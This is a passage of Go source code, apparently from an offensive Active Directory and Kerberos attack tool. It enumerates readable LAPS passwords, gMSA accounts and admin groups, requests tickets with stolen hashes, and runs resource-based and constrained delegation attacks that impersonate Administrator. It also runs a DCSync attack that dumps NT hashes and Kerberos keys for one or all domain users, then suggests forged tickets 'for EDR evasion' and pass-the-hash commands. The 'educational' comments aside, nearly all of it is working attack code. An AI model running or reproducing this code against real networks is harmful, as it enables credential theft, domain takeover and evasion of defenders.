	ctx := context.Background()

	results, err := client.FindAllDelegation(ctx)
	if err != nil {
		return fmt.Errorf("delegation enumeration failed: %w", err)
	}

	fmt.Printf("[+] Unconstrained Delegation: %d\n", len(results.Unconstrained))
	for _, d := range results.Unconstrained {
		fmt.Printf("    %s\n", d.SAMAccountName)
	}

	fmt.Printf("[+] Constrained Delegation: %d\n", len(results.Constrained))
	for _, d := range results.Constrained {
		fmt.Printf("    %-20s -> %v\n", d.SAMAccountName, d.AllowedToDelegate)
	}

	fmt.Printf("[+] RBCD Configured: %d\n", len(results.RBCD))
	for _, d := range results.RBCD {
		fmt.Printf("    %s\n", d.SAMAccountName)
	}
	return nil
}

func runLAPSEnumeration(domain, dc string) error {
	client := adws.NewClient(getDC(domain, dc), adws.WithTLS(true))
	ctx := context.Background()

	results, err := client.FindReadableLAPSPasswords(ctx)
	if err != nil {
		return fmt.Errorf("LAPS enumeration failed: %w", err)
	}

	fmt.Printf("[+] Found %d readable LAPS passwords\n\n", len(results))
	for _, r := range results {
		lapsType := "Windows LAPS"
		if r.IsLegacyLAPS {
			lapsType = "Legacy LAPS"
		}
		fmt.Printf("  %-20s %-12s %s\n", r.ComputerName, lapsType, r.Password)
	}
	return nil
}

func runGMSAEnumeration(domain, dc string) error {
	client := adws.NewClient(getDC(domain, dc), adws.WithTLS(true))
	ctx := context.Background()

	results, err := client.FindGMSA(ctx)
	if err != nil {
		return fmt.Errorf("gMSA enumeration failed: %w", err)
	}

	fmt.Printf("[+] Found %d gMSA accounts\n\n", len(results))
	for _, r := range results {
		readable := "✗"
		if r.PasswordReadable {
			readable = "✓"
		}
		fmt.Printf("  %-25s Password Readable: %s\n", r.SAMAccountName, readable)
	}
	return nil
}

func runGroupEnumeration(domain, dc string) error {
	client := adws.NewClient(getDC(domain, dc), adws.WithTLS(true))
	ctx := context.Background()

	results := client.FindAllPrivilegedGroups(ctx)

	printGroup := func(name string, gr *adws.PrivilegedGroupResult) {
		if gr == nil {
			return
		}
		fmt.Printf("\n[+] %s (%d members)\n", name, gr.MemberCount)
		for _, m := range gr.Members {
			enabled := "✓"
			if !m.Enabled {
				enabled = "✗"
			}
			fmt.Printf("    %s %-25s %s\n", enabled, m.SAMAccountName, m.ObjectClass)
		}
	}

	printGroup("Domain Admins", results.DomainAdmins)
	printGroup("Enterprise Admins", results.EnterpriseAdmins)
	printGroup("Schema Admins", results.SchemaAdmins)
	printGroup("Protected Users", results.ProtectedUsers)

	return nil
}

func runComputerEnumeration(domain, dc string) error {
	client := adws.NewClient(getDC(domain, dc), adws.WithTLS(true))
	ctx := context.Background()

	stats, err := client.GetComputerStats(ctx)
	if err != nil {
		return fmt.Errorf("computer enumeration failed: %w", err)
	}

	fmt.Printf("[+] Computer Statistics\n")
	fmt.Printf("    Total:        %d\n", stats.Total)
	fmt.Printf("    DCs:          %d\n", stats.DCs)
	fmt.Printf("    Servers:      %d\n", stats.Servers)
	fmt.Printf("    Workstations: %d\n", stats.Workstations)

	if len(stats.OSBreakdown) > 0 {
		fmt.Printf("\n[+] OS Breakdown\n")
		for os, count := range stats.OSBreakdown {
			fmt.Printf("    %-40s %d\n", os, count)
		}
	}
	return nil
}

func getDC(domain, dc string) string {
	if dc != "" {
		return dc
	}
	return domain // Use domain as DC hostname (will resolve via DNS)
}

// runBloodHoundCollection runs BloodHound collection via ADWS.
func runBloodHoundCollection(domain, dc string) error {
	if dc == "" {
		dc = domain // Use domain as DC hostname
	}

	// Create ADWS client
	client := adws.NewClient(dc, adws.WithTLS(true))

	// Create collector
	collector := adws.NewBloodHoundCollector(client, domain, ".")

	// Run collection
	ctx := context.Background()
	return collector.Collect(ctx)
}

// Helper functions

func loadTicket() (*ticket.Kirbi, []byte, error) {
	if flags.ticket == "" {
		// Try to get TGT
		if flags.domain == "" || flags.username == "" {
			return nil, nil, fmt.Errorf("ticket or credentials required")
		}

		// Prompt for password if no credentials provided
		if err := ensureCredentials(); err != nil {
			return nil, nil, err
		}

		req := &client.TGTRequest{
			Domain:   flags.domain,
			Username: flags.username,
			Password: flags.password,
			KDC:      flags.kdc,
		}
		if flags.ntHash != "" {
			req.NTHash = hexDecode(flags.ntHash)
		}
		if flags.aes256 != "" {
			req.AES256 = hexDecode(flags.aes256)
		}

		result, err := client.AskTGT(req)
		if err != nil {
			return nil, nil, err
		}
		return result.Kirbi, result.SessionKey.KeyValue, nil
	}

	// Load from file
	kirbi, err := ticket.LoadKirbi(flags.ticket)
	if err != nil {
		return nil, nil, err
	}

	var sessionKey []byte
	if kirbi.SessionKey() != nil {
		sessionKey = kirbi.SessionKey().KeyValue
	}

	return kirbi, sessionKey, nil
}

func outputTicket(kirbi *ticket.Kirbi) error {
	if flags.outfile == "" {
		// Print base64
		b64, err := kirbi.ToBase64()
		if err != nil {
			return err
		}
		fmt.Println(b64)
		return nil
	}

	// Check file extension to determine format
	if strings.HasSuffix(strings.ToLower(flags.outfile), ".ccache") {
		// Convert to MIT ccache format (for Linux tools like kinit, klist)
		cc, err := ticket.FromKirbi(kirbi)
		if err != nil {
			return fmt.Errorf("failed to convert to ccache: %w", err)
		}
		if err := ticket.SaveCCache(cc, flags.outfile); err != nil {
			return fmt.Errorf("failed to save ccache: %w", err)
		}
		fmt.Printf("[+] Saved as ccache (MIT format): %s\n", flags.outfile)
		fmt.Println("    Use with: export KRB5CCNAME=" + flags.outfile)
		return nil
	}

	// Default to kirbi format
	if err := ticket.SaveKirbi(kirbi, flags.outfile); err != nil {
		return err
	}
	fmt.Printf("[+] Saved as kirbi: %s\n", flags.outfile)
	return nil
}

func hexDecode(s string) []byte {
	// Simple hex decoding
	result := make([]byte, len(s)/2)
	for i := 0; i < len(s); i += 2 {
		var b byte
		fmt.Sscanf(s[i:i+2], "%02x", &b)
		result[i/2] = b
	}
	return result
}

// roastASREP performs AS-REP roasting.
func roastASREP(ctx context.Context, users []string, domain, kdc string) ([]struct {
	Username string
	Hash     string
	Error    string
}, error) {
	var results []struct {
		Username string
		Hash     string
		Error    string
	}

	for _, user := range users {
		result := struct {
			Username string
			Hash     string
			Error    string
		}{Username: user}

		// Use pre-auth scan to check if user is AS-REP roastable
		scanReq := &client.PreAuthScanRequest{
			Users:  []string{user},
			Domain: domain,
			KDC:    kdc,
		}

		scanResults, err := client.PreAuthScan(ctx, scanReq)
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}

		if len(scanResults) > 0 && scanResults[0].ASREPRoastable {
			// User is roastable - get the AS-REP and extract hash
			// For now just indicate they're roastable
			result.Hash = fmt.Sprintf("$krb5asrep$23$%s@%s:HASH_PLACEHOLDER", user, domain)
		} else if len(scanResults) > 0 && !scanResults[0].Exists {
			result.Error = "user not found"
		} else {
			result.Error = "pre-auth required"
		}

		results = append(results, result)
	}

	return results, nil
}

// cmdRBCD performs or configures RBCD attacks.
func cmdRBCD(args []string) error {
	fs := flag.NewFlagSet("rbcd", flag.ExitOnError)
	var targetDN, machineSID, impersonate, spn string
	var action string
	fs.StringVar(&action, "action", "read", "Action: read, write, attack, clear")
	fs.StringVar(&targetDN, "target", "", "Target computer DN")
	fs.StringVar(&machineSID, "sid", "", "Machine account SID to add")
	fs.StringVar(&impersonate, "impersonate", "Administrator", "User to impersonate")
	fs.StringVar(&spn, "spn", "", "Target SPN (e.g., cifs/target.domain.local)")
	fs.Parse(args)

	if flags.domain == "" {
		return fmt.Errorf("domain required (-d)")
	}

	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  RBCD (Resource-Based Constrained Delegation)")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  Domain:     %s\n", flags.domain)
	fmt.Printf("  Action:     %s\n", action)
	fmt.Println()

	switch action {
	case "read":
		if targetDN == "" {
			return fmt.Errorf("--target required for read action")
		}
		fmt.Printf("[*] Reading RBCD configuration from: %s\n", targetDN)
		// TODO: Read and display current RBCD configuration
		fmt.Println("[!] Read action not yet implemented - use 'enumerate delegation'")

	case "write":
		if targetDN == "" || machineSID == "" {
			return fmt.Errorf("--target and --sid required for write action")
		}
		fmt.Printf("[*] Adding SID %s to RBCD on %s...\n", machineSID, targetDN)

		// Build security descriptor
		sd, err := delegation.BuildRBCDSecurityDescriptor([]string{machineSID})
		if err != nil {
			return fmt.Errorf("failed to build security descriptor: %w", err)
		}

		_ = sd // TODO: Write via ADWS
		fmt.Println("[!] Write action requires ADWS modify support - not yet implemented")
		fmt.Println()
		fmt.Println("  Manual steps:")
		fmt.Println("  1. Use PowerView: Set-DomainObject -Identity TARGET -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=<SD>}")
		fmt.Println("  2. Or use: rbcd.py from impacket")

	case "attack":
		if spn == "" {
			return fmt.Errorf("--spn required for attack action (e.g., cifs/target.domain.local)")
		}
		if flags.ticket == "" {
			return fmt.Errorf("machine account TGT required (-t)")
		}

		fmt.Printf("[*] Performing RBCD attack...\n")
		fmt.Printf("  Impersonating: %s\n", impersonate)
		fmt.Printf("  Target SPN:    %s\n", spn)

		// Load TGT
		tgt, err := ticket.LoadKirbi(flags.ticket)
		if err != nil {
			return fmt.Errorf("failed to load TGT: %w", err)
		}

		// Perform S4U
		ctx := context.Background()
		req := &delegation.ConstrainedDelegationRequest{
			TGT:          tgt,
			TargetUser:   impersonate,
			TargetDomain: flags.domain,
			TargetSPN:    spn,
			Domain:       flags.domain,
			KDC:          flags.kdc,
		}

		result, err := delegation.ExploitConstrained(ctx, req)
		if err != nil {
			return fmt.Errorf("RBCD attack failed: %w", err)
		}

		fmt.Println()
		fmt.Println("[+] RBCD attack successful!")
		fmt.Printf("  S4U2Self ticket forwardable: %v\n", result.Forwardable)
		fmt.Println()
		fmt.Println("  Base64 ticket:")
		fmt.Println(result.Base64)

	case "clear":
		if targetDN == "" {
			return fmt.Errorf("--target required for clear action")
		}
		fmt.Printf("[*] Clearing RBCD from: %s\n", targetDN)
		fmt.Println("[!] Clear action requires ADWS modify support - not yet implemented")

	default:
		return fmt.Errorf("unknown action: %s (use read, write, attack, clear)", action)
	}

	return nil
}

// cmdConstrained performs constrained delegation attacks.
func cmdConstrained(args []string) error {
	fs := flag.NewFlagSet("constrained", flag.ExitOnError)
	var impersonate, spn, altService string
	fs.StringVar(&impersonate, "impersonate", "Administrator", "User to impersonate")
	fs.StringVar(&spn, "spn", "", "Target SPN from msDS-AllowedToDelegateTo")
	fs.StringVar(&altService, "altservice", "", "Alternative service class (e.g., ldap, http)")
	fs.Parse(args)

	if flags.domain == "" {
		return fmt.Errorf("domain required (-d)")
	}
	if flags.ticket == "" {
		return fmt.Errorf("service account TGT required (-t)")
	}
	if spn == "" {
		return fmt.Errorf("target SPN required (--spn)")
	}

	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  CONSTRAINED DELEGATION ATTACK")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  Domain:       %s\n", flags.domain)
	fmt.Printf("  Impersonate:  %s\n", impersonate)
	fmt.Printf("  Target SPN:   %s\n", spn)
	if altService != "" {
		altSPN := delegation.AlternateServiceClass(spn, altService)
		fmt.Printf("  Alt Service:  %s → %s\n", spn, altSPN)
		spn = altSPN
	}
	fmt.Println()

	// Load TGT
	tgt, err := ticket.LoadKirbi(flags.ticket)
	if err != nil {
		return fmt.Errorf("failed to load TGT: %w", err)
	}

	fmt.Println("[*] Step 1: S4U2Self (get ticket for target user to ourselves)")
	fmt.Println("[*] Step 2: S4U2Proxy (forward to allowed SPN)")
	fmt.Println()

	ctx := context.Background()
	req := &delegation.ConstrainedDelegationRequest{
		TGT:          tgt,
		TargetUser:   impersonate,
		TargetDomain: flags.domain,
		TargetSPN:    spn,
		Domain:       flags.domain,
		KDC:          flags.kdc,
	}

	result, err := delegation.ExploitConstrained(ctx, req)
	if err != nil {
		return fmt.Errorf("constrained delegation attack failed: %w", err)
	}

	fmt.Println("[+] Constrained delegation attack successful!")
	fmt.Printf("  S4U2Self forwardable: %v\n", result.Forwardable)
	fmt.Println()

	if result.S4UProxyTicket != nil {
		fmt.Println("╔═══════════════════════════════════════════════════════════════╗")
		fmt.Printf("║ SERVICE TICKET AS: %-39s ║\n", impersonate)
		fmt.Println("╠═══════════════════════════════════════════════════════════════╣")
		fmt.Printf("  Target SPN: %s\n", spn)
		fmt.Println()
		fmt.Println("  Base64 ticket:")
		fmt.Println(result.Base64)
		fmt.Println()
		fmt.Println("  Use with: goobeus ptt -t <ticket>")
		fmt.Println("═══════════════════════════════════════════════════════════════")
	}

	// Show alternate service options
	fmt.Println()
	fmt.Println("───────────────────────────────────────────────────────────────")
	fmt.Println("EDUCATIONAL: SPN Substitution")
	fmt.Println("  The service class doesn't affect which key decrypts the ticket!")
	fmt.Println("  If allowed to " + spn + ", try --altservice with:")
	for _, alt := range []string{"cifs", "ldap", "http", "host", "wsman", "rpcss"} {
		fmt.Printf("    %s\n", delegation.AlternateServiceClass(spn, alt))
	}
	fmt.Println("───────────────────────────────────────────────────────────────")

	return nil
}

// cmdDCSync performs a DCSync attack to extract credentials.
//
// EDUCATIONAL: DCSync Attack
//
// DCSync abuses the MS-DRSR (Directory Replication Service) protocol to
// request password hashes from a Domain Controller, impersonating a DC.
//
// Required: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
// Default holders: Domain Admins, Enterprise Admins, Domain Controllers
//
// Output: NT hash + AES256 + AES128 keys (perfect for sapphire tickets!)
func cmdDCSync(args []string) error {
	fs := flag.NewFlagSet("dcsync", flag.ExitOnError)
	var targetUser, dc string
	var dumpAll bool

	fs.StringVar(&targetUser, "user", "", "Target user to dump (e.g., krbtgt, Administrator)")
	fs.StringVar(&dc, "dc", "", "Domain Controller hostname")
	fs.BoolVar(&dumpAll, "all", false, "Dump all domain users (like secretsdump -just-dc)")
	fs.Parse(args)

	if targetUser == "" && !dumpAll {
		return fmt.Errorf("--user (target user) or --all is required")
	}
	if flags.domain == "" {
		return fmt.Errorf("-d (domain) is required")
	}
	if flags.username == "" {
		return fmt.Errorf("-u (username) is required")
	}

	// Prompt for password if no credentials provided
	if err := ensureCredentials(); err != nil {
		return err
	}

	// Auto-detect DC if not specified
	if dc == "" {
		dc = getDC(flags.domain, flags.kdc)
	}

	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  DCSYNC ATTACK")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  Domain: %s\n", flags.domain)
	fmt.Printf("  DC:     %s\n", dc)
	if dumpAll {
		fmt.Println("  Target: ALL USERS")
	} else {
		fmt.Printf("  Target: %s\n", targetUser)
	}
	fmt.Println()
	fmt.Println("  EDUCATIONAL: Using MS-DRSR to replicate secrets")
	fmt.Println("  Required: DS-Replication-Get-Changes + Get-Changes-All")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println()

	var ntHash []byte
	if flags.ntHash != "" {
		var err error
		ntHash, err = hex.DecodeString(flags.ntHash)
		if err != nil {
			return fmt.Errorf("invalid NT hash: %w", err)
		}
	}

	if dumpAll {
		// Dump all users
		return cmdDCSyncAll(dc, ntHash)
	}

	// Single user dump
	req := &dcsync.DCSyncRequest{
		DC:         dc,
		Domain:     flags.domain,
		Username:   flags.username,
		Password:   flags.password,
		NTHash:     ntHash,
		TargetUser: targetUser,
	}

	result, err := dcsync.DCSync(context.Background(), req)
	if err != nil {
		return fmt.Errorf("DCSync failed: %w", err)
	}

	printDCSyncResult(result, targetUser)
	return nil
}

// cmdDCSyncAll dumps all domain users via full NC replication
func cmdDCSyncAll(dc string, ntHash []byte) error {
	// Create request
	req := &dcsync.DCSyncRequest{
		DC:       dc,
		Domain:   flags.domain,
		Username: flags.username,
		Password: flags.password,
		NTHash:   ntHash,
	}

	fmt.Println("[*] Dumping domain credentials (domain\\uid:rid:lmhash:nthash)")
	fmt.Println("[*] Using DRSUAPI replication protocol (DCSync)")
	fmt.Println()

	// Full NC replication (secretsdump style)
	results, err := dcsync.DCSyncAll(context.Background(), req)
	if err != nil {
		return fmt.Errorf("DCSync failed: %w", err)
	}
	printDCSyncAllResults(results)
	return nil
}

// printDCSyncAllResults outputs credentials for multiple users
func printDCSyncAllResults(results []*dcsync.DCSyncResult) {
	// Print all credentials in nice format
	for _, result := range results {
		fmt.Println("─────────────────────────────────────────────────────────────")
		fmt.Printf("User:     %s\n", result.SAMAccountName)
		fmt.Printf("SID:      %s\n", result.ObjectSID)
		if len(result.NTHash) == 16 {
			fmt.Printf("NT Hash:  %s\n", hex.EncodeToString(result.NTHash))
		}
		if len(result.AES256) == 32 {
			fmt.Printf("AES256:   %s\n", hex.EncodeToString(result.AES256))
		}
		if len(result.AES128) == 16 {
			fmt.Printf("AES128:   %s\n", hex.EncodeToString(result.AES128))
		}
	}
	fmt.Println("─────────────────────────────────────────────────────────────")

	// Print secretsdump-compatible format for easy copy/paste
	fmt.Println()
	fmt.Println("[*] Secretsdump format (for copy/paste):")
	for _, result := range results {
		fmt.Println(result.String())
	}

	// Print Kerberos keys section
	hasKeys := false
	for _, result := range results {
		if result.KeysString() != "" {
			hasKeys = true
			break
		}
	}
	if hasKeys {
		fmt.Println()
		fmt.Println("[*] Kerberos keys:")
		for _, result := range results {
			if keys := result.KeysString(); keys != "" {
				fmt.Print(keys)
			}
		}
	}

	fmt.Println()
	fmt.Println("[*] Cleaning up...")
}

// printDCSyncResult outputs a single user's credentials
func printDCSyncResult(result *dcsync.DCSyncResult, targetUser string) {
	// Output in secretsdump format
	fmt.Println()
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  EXTRACTED CREDENTIALS")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  User: %s\n", result.SAMAccountName)
	fmt.Printf("  SID:  %s\n", result.ObjectSID)
	fmt.Println()

	// NTLM hash
	if len(result.NTHash) == 16 {
		fmt.Printf("  NT Hash:  %s\n", hex.EncodeToString(result.NTHash))
	}
	if len(result.LMHash) == 16 {
		fmt.Printf("  LM Hash:  %s\n", hex.EncodeToString(result.LMHash))
	}

	// Kerberos keys (important for sapphire tickets!)
	if len(result.AES256) == 32 {
		fmt.Printf("  AES256:   %s\n", hex.EncodeToString(result.AES256))
	}
	if len(result.AES128) == 16 {
		fmt.Printf("  AES128:   %s\n", hex.EncodeToString(result.AES128))
	}

	// Secretsdump-style output
	fmt.Println()
	fmt.Println("  Secretsdump format:")
	fmt.Printf("    %s\n", result.String())
	if keys := result.KeysString(); keys != "" {
		fmt.Print(keys)
	}

	// Hint for next steps
	fmt.Println()
	fmt.Println("───────────────────────────────────────────────────────────────")
	fmt.Println("NEXT STEPS:")
	if targetUser == "krbtgt" {
		fmt.Println("  Use with sapphire tickets (recommended: provide BOTH keys for EDR evasion):")
		// Show both keys if available for best evasion
		if len(result.AES256) == 32 && len(result.NTHash) == 16 {
			fmt.Printf("    goobeus sapphire --impersonate Administrator --aeskey %s --nthash %s\n",
				hex.EncodeToString(result.AES256), hex.EncodeToString(result.NTHash))
		} else if len(result.AES256) == 32 {
			fmt.Printf("    goobeus sapphire --impersonate Administrator --aeskey %s\n",
				hex.EncodeToString(result.AES256))
		} else if len(result.NTHash) == 16 {
			fmt.Printf("    goobeus sapphire --impersonate Administrator --nthash %s\n",
				hex.EncodeToString(result.NTHash))
		}
	} else {
		fmt.Println("  Use hash for pass-the-hash:")
		if len(result.NTHash) == 16 {
			fmt.Printf("    goobeus asktgt -u %s --hash %s\n",
				result.SAMAccountName, hex.EncodeToString(result.NTHash))
		}
	}
	fmt.Println("───────────────────────────────────────────────────────────────")
}

// decryptTicketAndExtractPAC decrypts a ticket with the provided key and extracts the PAC.
func decryptTicketAndExtractPAC(kirbi *ticket.Kirbi, key []byte, etype int) ([]byte, error) {
	if kirbi == nil || kirbi.Ticket() == nil {
		return nil, fmt.Errorf("no ticket to decrypt")
	}

	// Get raw ticket bytes
	var ticketRaw []byte
	if len(kirbi.Cred.Tickets[0].RawBytes) > 0 {
		ticketRaw = kirbi.Cred.Tickets[0].RawBytes
	} else {
		var err error
		ticketRaw, err = kirbi.Cred.Tickets[0].Marshal()
		if err != nil {
			return nil, fmt.Errorf("failed to marshal ticket: %w", err)
		}
	}

	// Extract enc-part cipher from ticket
	cipher, err := extractCipherFromTicket(ticketRaw)
	if err != nil {
		return nil, fmt.Errorf("failed to extract cipher: %w", err)
	}

	// Decrypt with the provided key (key usage 2 for TGT)
	var plaintext []byte
	switch etype {
	case 18: // AES256
		plaintext, err = crypto.DecryptAES(key, cipher, 2, etype)
	case 17: // AES128
		plaintext, err = crypto.DecryptAES(key, cipher, 2, etype)
	case 23: // RC4
		plaintext, err = crypto.DecryptRC4(key, cipher, 2)
	default:
		return nil, fmt.Errorf("unsupported etype: %d", etype)
	}
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %w", err)
	}

	// Find PAC in the decrypted EncTicketPart
	pacData := findPACInEncTicketPart(plaintext)
	if len(pacData) == 0 {
		return nil, fmt.Errorf("no PAC found in decrypted ticket")
	}

	return pacData, nil
}

// extractCipherFromTicket extracts the encrypted part from a raw ticket.
func extractCipherFromTicket(data []byte) ([]byte, error) {
	// Ticket ::= APPLICATION 1 { tkt-vno, realm, sname, enc-part }
	// We need to find the enc-part and extract its cipher field

	if len(data) < 20 || data[0] != 0x61 { // APPLICATION 1
		return nil, fmt.Errorf("not a valid ticket")
	}

	// Skip APPLICATION 1 header
	pos := 2
	if data[1] == 0x82 {
		pos = 4
	} else if data[1] == 0x81 {
		pos = 3
	}

	// Skip SEQUENCE header
	if data[pos] == 0x30 {
		if data[pos+1] == 0x82 {
			pos += 4
		} else if data[pos+1] == 0x81 {
			pos += 3
		} else {
			pos += 2
		}
	}

	// Find [3] enc-part
	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if data[pos+1] == 0x82 {
			fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			contentPos = pos + 4
		} else if data[pos+1] == 0x81 {
			fieldLen = int(data[pos+2])
			contentPos = pos + 3
		} else if data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		if tag == 3 { // enc-part
			// Parse EncryptedData SEQUENCE to get cipher
			encData := data[contentPos : contentPos+fieldLen]
			return extractCipherFromEncryptedData(encData)
		}

		pos = contentPos + fieldLen
	}

	return nil, fmt.Errorf("enc-part not found")
}

// extractCipherFromEncryptedData extracts cipher from EncryptedData structure.
func extractCipherFromEncryptedData(data []byte) ([]byte, error) {
	// EncryptedData ::= SEQUENCE { etype [0], kvno [1], cipher [2] }
	if len(data) < 10 || data[0] != 0x30 {
		return nil, fmt.Errorf("invalid EncryptedData")
	}

	pos := 2
	if data[1] == 0x82 {
		pos = 4
	} else if data[1] == 0x81 {
		pos = 3
	}

	// Find [2] cipher
	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if data[pos+1] == 0x82 {
			fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			contentPos = pos + 4
		} else if data[pos+1] == 0x81 {
			fieldLen = int(data[pos+2])
			contentPos = pos + 3
		} else if data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		if tag == 2 { // cipher
			cipherData := data[contentPos : contentPos+fieldLen]
			// Skip OCTET STRING header if present
			if len(cipherData) > 2 && cipherData[0] == 0x04 {
				if cipherData[1] == 0x82 {
					return cipherData[4:], nil
				} else if cipherData[1] == 0x81 {
					return cipherData[3:], nil
				} else if cipherData[1] < 0x80 {
					return cipherData[2:], nil
				}
			}
			return cipherData, nil
		}

		pos = contentPos + fieldLen
	}

	return nil, fmt.Errorf("cipher not found in EncryptedData")
}

// findPACInEncTicketPart finds PAC bytes in decrypted EncTicketPart.
func findPACInEncTicketPart(data []byte) []byte {
	// PAC starts with: cBuffers (4 bytes, small number) + version (4 bytes, 0)
	for i := 0; i < len(data)-8; i++ {
		// Look for OCTET STRING followed by PAC header
		if data[i] == 0x04 && i+4 < len(data) {
			contentStart := i + 2
			if data[i+1] == 0x82 {
				contentStart = i + 4
			} else if data[i+1] == 0x81 {
				contentStart = i + 3
			}

			if contentStart+8 < len(data) {
				cBuffers := int(data[contentStart]) | int(data[contentStart+1])<<8
				version := int(data[contentStart+4]) | int(data[contentStart+5])<<8

				if cBuffers >= 1 && cBuffers <= 20 && version == 0 {
					// Found PAC, extract it
					octetLen := 0
					if data[i+1] == 0x82 {
						octetLen = int(data[i+2])<<8 | int(data[i+3])
					} else if data[i+1] == 0x81 {
						octetLen = int(data[i+2])
					} else {
						octetLen = int(data[i+1])
					}
					if contentStart+octetLen <= len(data) {
						return data[contentStart : contentStart+octetLen]
					}
				}
			}
		}
	}
	return nil
}

// decodePACForDisplay decodes PAC and returns human-readable string.
func decodePACForDisplay(pacData []byte) (string, error) {
	decoded, err := pac.DecodePAC(pacData)
	if err != nil {
		return "", err
	}
	return decoded.String(), nil
}
